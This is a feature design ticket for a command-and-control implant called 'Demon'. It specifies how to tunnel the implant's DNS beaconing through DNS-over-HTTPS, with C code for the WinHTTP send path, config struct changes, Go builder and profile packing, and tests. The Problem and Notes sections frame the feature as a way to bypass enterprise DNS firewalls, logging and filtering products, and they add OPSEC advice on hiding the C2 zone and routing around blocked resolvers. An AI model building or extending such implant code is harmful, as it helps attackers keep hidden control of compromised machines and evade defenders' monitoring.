# HVC-028 — DNS-over-HTTPS Transport

**Status:** Pending

---

## Problem

The DNS transport (`payloads/Demon/src/core/TransportDns.c`, 447 lines) sends DNS queries directly to a configurable resolver over raw UDP or TCP on port 53. This has two operational problems:

1. **DNS is fully visible at the resolver.** Enterprise environments typically log all DNS queries. DNS-filtering products (Cisco Umbrella, Zscaler DNS, NextDNS, etc.) inspect query content and can identify beaconing patterns, block custom subdomains, or alert on high-frequency lookups. Even if the DNS resolver is the operator's own authoritative server, traffic to it on port 53 is conspicuous and logged at the network edge.

2. **Port 53 is commonly filtered or redirected.** Many corporate firewalls redirect all outbound UDP/53 to an internal resolver, defeating the operator's choice of resolver entirely.

DNS-over-HTTPS (DoH, RFC 8484) wraps the identical DNS wire-format query inside an HTTPS POST request to a DoH resolver endpoint. From a network perspective, the traffic is HTTPS on port 443 — indistinguishable from any HTTPS web request. DoH bypasses DNS firewalls, avoids port-53 filtering, and is not logged by standard DNS monitoring because the query is encapsulated in TLS.

The existing WinHTTP session handle (`Instance->Modules.WinHttp` / `Instance->Win32.WinHttpOpen` etc.) is already resolved in the Demon for the HTTP transport. No new Win32 function pointers or module loads are required.

---

## Scope

**Demon side:** Modify `TransportDns.c` to add an optional DoH send path. Two new config fields control it. All DNS encoding/decoding (subdomain chunking, TXT reassembly) remains unchanged — DoH only replaces the network call that delivers the DNS wire packet.

**Teamserver side:** No changes. The existing DNS handler in `dns.go` parses standard DNS wire format. A DoH-wrapped query arrives at the teamserver's authoritative DNS server as an ordinary DNS query (the DoH resolver forwards it as normal DNS to the zone's NS). The teamserver is unaware of whether the Demon used DoH or plain DNS.

**Profile:** Add two optional fields to `ListenerDNS` in `config.go`.

**Builder:** Pack the two new fields into the DNS config block in `PatchConfig()`.

**Client:** No changes required — the existing DNS listener dialog already exposes the fields needed; the two new fields can be added as optional text inputs to the existing DNS listener form in `Listener.cc` if desired, but this is cosmetic and can be deferred.

---

## Design

### RFC 8484 Wire Format

The DNS query bytes (standard DNS wire format) are sent as the HTTP POST body:

```
POST /dns-query HTTP/1.1
Host: 1.1.1.1
Content-Type: application/dns-message
Accept: application/dns-message
Content-Length: <N>

[N bytes of DNS wire format]
```

The response body is also raw DNS wire format (`Content-Type: application/dns-message`). The Demon extracts the DNS response from the HTTP body using the same parsing it already applies to responses from `DnsQuery_W`.

`Content-Type` must be exactly `application/dns-message` per RFC 8484 section 4.1. Do not use `text/dns`, `application/json`, or any other value — DoH resolvers strictly validate this header and will return HTTP 415 if it is wrong.

### Demon Side — `TransportDns.c` Modifications

**New config fields** (parsed in `Demon.c:DemonConfig()` from the builder-packed binary):

```c
/* Inside the DNS transport config sub-struct */
BOOL    UseDoH;   /* TRUE  = use DNS-over-HTTPS; FALSE = standard DnsQuery_W */
LPWSTR  DoHUrl;   /* e.g. L"https://1.1.1.1/dns-query" or operator-supplied URL */
```

These map to the existing DNS config location in the `Instance` struct. Add them to `Demon.h` in the DNS transport config sub-struct (inside `#ifdef TRANSPORT_DNS`):

```c
#ifdef TRANSPORT_DNS
    struct {
        LPWSTR  ZoneDomain;
        LPWSTR* Hosts;
        DWORD   HostCount;
        DWORD   Port;
        DWORD   QueryTimeout;
        DWORD   ChunkDelayMs;
        /* HVC-028 DoH fields */
        BOOL    UseDoH;
        LPWSTR  DoHUrl;
    } DNS;
#endif
```

**New function — `DnsQueryDoH`:**

```c
/*
 * DnsQueryDoH — sends a raw DNS wire-format query via HTTPS POST to
 * Config.Transport.DNS.DoHUrl and returns the raw DNS wire-format response.
 *
 * Reuses the existing WinHTTP session handle; no new module loads needed.
 *
 * Parameters:
 *   WireQuery   — DNS wire-format query bytes (built by existing chunking code)
 *   QueryLen    — byte count of WireQuery
 *   ResponseBuf — receives a heap-allocated buffer containing the raw DNS response
 *   ResponseLen — receives the byte count of *ResponseBuf
 *
 * Returns TRUE on success; FALSE on any WinHTTP error.
 * Caller frees *ResponseBuf via RtlFreeHeap.
 */
static BOOL DnsQueryDoH(
    PBYTE   WireQuery,
    SIZE_T  QueryLen,
    PBYTE*  ResponseBuf,
    PSIZE_T ResponseLen
);
```

Implementation sketch:

```c
static BOOL DnsQueryDoH( PBYTE WireQuery, SIZE_T QueryLen, PBYTE* ResponseBuf, PSIZE_T ResponseLen ) {
    HINTERNET hConnect = NULL, hRequest = NULL;
    BOOL      Success  = FALSE;
    PBYTE     RespBuf  = NULL;
    SIZE_T    RespLen  = 0;

    /* Parse host and path from DoHUrl (Instance->Config.Transport.DNS.DoHUrl).
     * WinHttpCrackUrl is not dynamically resolved in this codebase;
     * use a simple manual split on the third '/' character. */
    WCHAR Host[256] = {0};
    LPCWSTR Path    = /* substring after host */ L"/dns-query";

    hConnect = Instance->Win32.WinHttpConnect(
        Instance->hSession, Host, INTERNET_DEFAULT_HTTPS_PORT, 0 );
    if ( !hConnect ) goto CLEANUP;

    hRequest = Instance->Win32.WinHttpOpenRequest(
        hConnect, L"POST", Path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE );
    if ( !hRequest ) goto CLEANUP;

    /* Set Content-Type and Accept headers per RFC 8484 */
    Instance->Win32.WinHttpAddRequestHeaders(
        hRequest,
        L"Content-Type: application/dns-message\r\nAccept: application/dns-message",
        (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD );

    if ( !Instance->Win32.WinHttpSendRequest(
            hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WireQuery, (DWORD)QueryLen, (DWORD)QueryLen, 0 ) )
        goto CLEANUP;

    if ( !Instance->Win32.WinHttpReceiveResponse( hRequest, NULL ) )
        goto CLEANUP;

    /* Read response body into heap buffer */
    DWORD Available = 0, Read = 0;
    while ( Instance->Win32.WinHttpQueryDataAvailable( hRequest, &Available ) && Available ) {
        PBYTE Tmp = Instance->Win32.RtlAllocateHeap(
            Instance->HeapHandle, HEAP_ZERO_MEMORY, RespLen + Available );
        if ( !Tmp ) goto CLEANUP;
        if ( RespBuf ) {
            MemCopy( Tmp, RespBuf, RespLen );
            Instance->Win32.RtlFreeHeap( Instance->HeapHandle, 0, RespBuf );
        }
        RespBuf = Tmp;
        Instance->Win32.WinHttpReadData( hRequest, RespBuf + RespLen, Available, &Read );
        RespLen += Read;
    }

    *ResponseBuf = RespBuf;
    *ResponseLen = RespLen;
    Success = ( RespLen > 0 );

CLEANUP:
    if ( hRequest ) Instance->Win32.WinHttpCloseHandle( hRequest );
    if ( hConnect ) Instance->Win32.WinHttpCloseHandle( hConnect );
    if ( !Success && RespBuf )
        Instance->Win32.RtlFreeHeap( Instance->HeapHandle, 0, RespBuf );
    return Success;
}
```

**Integration in `DnsQuery()` / `DnsQueryTxt()`:**

At the point where `DnsQuery_W` is currently called, add a conditional:

```c
if ( Instance->Config.Transport.DNS.UseDoH ) {
    /* Build DNS wire-format query manually (12-byte header + QNAME + QTYPE + QCLASS).
     * The Fqdn string is already computed by the existing chunking logic. */
    PBYTE  WireResp = NULL;
    SIZE_T WireLen  = 0;
    if ( DnsQueryDoH( WireQuery, WireQueryLen, &WireResp, &WireLen ) ) {
        /* Parse WireResp as a DNS wire response — same DNS_RECORDW parsing
         * already done after DnsQuery_W, but reading from raw bytes. */
        /* ... */
        Instance->Win32.RtlFreeHeap( Instance->HeapHandle, 0, WireResp );
    }
} else {
    status = Instance->Win32.DnsQuery_W( ... ); /* existing path */
}
```

The DoH path builds a minimal DNS query wire packet in-line (12-byte header: ID, flags, QDCOUNT=1; followed by QNAME encoded as length-prefixed labels; QTYPE=A or TXT; QCLASS=IN). The wire packet is small (typically under 64 bytes for a short FQDN) and can be built on the stack.

**No new Win32 function pointers needed.** All WinHTTP functions used above (`WinHttpConnect`, `WinHttpOpenRequest`, `WinHttpAddRequestHeaders`, `WinHttpSendRequest`, `WinHttpReceiveResponse`, `WinHttpQueryDataAvailable`, `WinHttpReadData`, `WinHttpCloseHandle`) are already present in `Instance->Win32` and resolved via the existing `H_FUNC_WINHTTP*` hash constants in `Defines.h`.

### Teamserver Side

No changes. The Demon's DNS-layer protocol is unchanged. The DoH resolver acts as a transparent DNS proxy — it receives the DNS query over HTTPS and forwards it as standard DNS to the operator's authoritative nameserver (the teamserver's DNS listener). The teamserver receives and responds to the query exactly as it does today.

### Profile — `teamserver/pkg/profile/config.go`

Add two optional fields to `ListenerDNS`:

```go
type ListenerDNS struct {
    Name         string   `yaotl:"Name"`
    Hosts        []string `yaotl:"Hosts,optional"`
    HostBind     string   `yaotl:"HostBind"`
    Port         int      `yaotl:"Port"`
    ZoneDomain   string   `yaotl:"ZoneDomain"`
    QueryTimeout int      `yaotl:"QueryTimeout,optional"`
    ChunkDelayMs int      `yaotl:"ChunkDelayMs,optional"`
    // HVC-028: DNS-over-HTTPS
    DoH    bool   `yaotl:"DoH,optional"`    // default false
    DoHUrl string `yaotl:"DoHUrl,optional"` // e.g. "https://1.1.1.1/dns-query"
}
```

Default: `DoH = false`. When false, `DoHUrl` is ignored and the Demon uses the standard `DnsQuery_W` path. Existing profiles require no modification.

Example profile snippet:

```
Listeners {
    Dns "dns-primary" {
        HostBind    = "0.0.0.0"
        Port        = 53
        ZoneDomain  = "c2.example.com"
        DoH         = true
        DoHUrl      = "https://1.1.1.1/dns-query"
    }
}
```

### Builder — `teamserver/pkg/common/builder/builder.go`

In `PatchConfig()`, after the existing DNS config block (around line 1259–1266), append the two new fields. The Demon reads them in this order immediately after `ChunkDelayMs`:

```go
// existing DNS block ends at:
DemonConfig.AddInt32(int32(Config.Config.ChunkDelayMs))

// HVC-028: DoH config
if Config.Config.DoH {
    DemonConfig.AddInt32(1) // UseDoH = TRUE
    DemonConfig.AddWString(Config.Config.DoHUrl)
} else {
    DemonConfig.AddInt32(0) // UseDoH = FALSE
    DemonConfig.AddWString("") // DoHUrl placeholder (Demon skips when UseDoH=FALSE)
}
```

The Demon's `DemonConfig()` parser reads the int32 UseDoH flag and the wstring DoHUrl unconditionally (even if UseDoH=FALSE, to keep the read cursor aligned). When `UseDoH=FALSE`, `DoHUrl` is written as an empty wstring and the Demon ignores it.

---

## File Map

| File | Change |
|------|--------|
| `payloads/Demon/src/core/TransportDns.c` | Add `DnsQueryDoH()` static function; add `UseDoH` branch in `DnsQueryA()` and `DnsQueryTxt()` |
| `payloads/Demon/include/Demon.h` | Add `UseDoH BOOL` and `DoHUrl LPWSTR` to the DNS config sub-struct (inside `#ifdef TRANSPORT_DNS`) |
| `payloads/Demon/src/Demon.c` | Parse `UseDoH` int32 and `DoHUrl` wstring in `DemonConfig()` after existing DNS fields |
| `teamserver/pkg/profile/config.go` | Add `DoH bool` and `DoHUrl string` to `ListenerDNS` |
| `teamserver/pkg/common/builder/builder.go` | Pack `UseDoH` int32 and `DoHUrl` wstring in `PatchConfig()` DNS section |

---

## Tests

**Profile parsing — Go unit test:**

```go
func TestListenerDNSDoH(t *testing.T) {
    // Parse a yaotl profile string containing:
    //   DoH = true
    //   DoHUrl = "https://1.1.1.1/dns-query"
    // Assert Config.Listeners.ListenerDNS[0].DoH == true
    // Assert Config.Listeners.ListenerDNS[0].DoHUrl == "https://1.1.1.1/dns-query"
}

func TestListenerDNSDoHDefault(t *testing.T) {
    // Parse a yaotl profile without DoH fields
    // Assert Config.Listeners.ListenerDNS[0].DoH == false
    // Assert Config.Listeners.ListenerDNS[0].DoHUrl == ""
}
```

**Builder packing — Go unit test:**

```go
func TestPatchConfigDNSDoH(t *testing.T) {
    // Set up a builder with DNS config, DoH=true, DoHUrl="https://8.8.8.8/dns-query"
    // Call PatchConfig()
    // Verify the output byte slice contains the expected int32(1) and the
    // UTF-16LE encoded DoHUrl string at the correct offset
}
```

**Functional test:**

Build the Demon with `TRANSPORT_DNS` active and `UseDoH=TRUE`/`DoHUrl=L"https://1.1.1.1/dns-query"`. Point the DNS zone at the teamserver. Verify:
1. Wireshark on the Demon host shows HTTPS traffic to `1.1.1.1:443`, not UDP/53.
2. The teamserver DNS handler receives queries and the Demon checks in successfully.
3. TXT data responses are correctly reassembled.

---

## Notes

- **Content-Type is non-negotiable.** RFC 8484 mandates `application/dns-message` for both request and response. Cloudflare 1.1.1.1, Google 8.8.8.8, and other major DoH resolvers return HTTP 415 Unsupported Media Type for any other Content-Type. Do not accept `text/dns`, `application/json` (Google's legacy DNS-JSON format is a different, incompatible API), or `application/x-www-form-urlencoded`.

- **OPSEC — SNI leakage.** When the Demon connects to the DoH resolver, the TLS ClientHello SNI field contains the DoH resolver's hostname (e.g. `1.1.1.1` or `cloudflare-dns.com`), not the C2 zone domain. The zone domain only appears inside the encrypted DNS query. This is a significant improvement over plain DNS (where the zone domain is in plaintext on the wire), but an observer can still see that the host is talking to a known DoH resolver. Document this in profile comments so operators understand the residual exposure.

- **Blocked DoH endpoints.** Enterprise environments that enforce DNS policy often block direct access to 1.1.1.1 and 8.8.8.8 at the network level. The `DoHUrl` field deliberately accepts an arbitrary URL — operators can point it at a custom DoH endpoint (a Cloudflare Worker, a corporate proxy that supports DoH forwarding, or a self-hosted `dnsdist` instance with DoH enabled on a non-standard IP). This flexibility is the primary reason `DoHUrl` is a full URL rather than just a hostname.

- **WinHTTP session reuse.** The DoH path reuses the existing `Instance->hSession` WinHTTP session handle opened by `TransportHttp.c` during `TransportInit`. There must be only one `WinHttpOpen` call per Demon instance. If `TRANSPORT_DNS` is compiled without `TRANSPORT_HTTP`, `hSession` may be NULL — in that case `DnsQueryDoH` must call `WinHttpOpen` itself and store the handle. Add a guard: `if ( !Instance->hSession ) { Instance->hSession = Instance->Win32.WinHttpOpen(...); }`.

- **DNS wire packet construction.** The existing `TransportDns.c` uses `DnsQuery_W` which accepts a domain name string and handles wire encoding internally. For DoH, the wire packet must be built manually. The format is straightforward: 12-byte fixed header (2-byte ID, 2-byte flags `0x0100` for standard query, QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0) followed by the QNAME (each label as 1-byte length + ASCII bytes, terminated by a 0x00 length byte), then QTYPE (2 bytes, 0x0001=A or 0x0010=TXT) and QCLASS (2 bytes, 0x0001=IN). Total size for a typical C2 subdomain FQDN is under 256 bytes and can be allocated on the stack.

- **Backward compatibility.** The two new profile fields are tagged `optional`. All existing DNS listener profiles without `DoH` and `DoHUrl` continue to work unchanged — `DoH` defaults to `false` and the Demon uses the existing `DnsQuery_W` path.

- **No teamserver changes required (ever).** The teamserver's DNS handler processes DNS wire format arriving at port 53. Whether the Demon delivered that query via plain DNS or via DoH is irrelevant — the DoH resolver handles the HTTPS-to-DNS translation transparently before the packet reaches the teamserver. This is a fundamental property of DoH: it is a client-side transport change only.
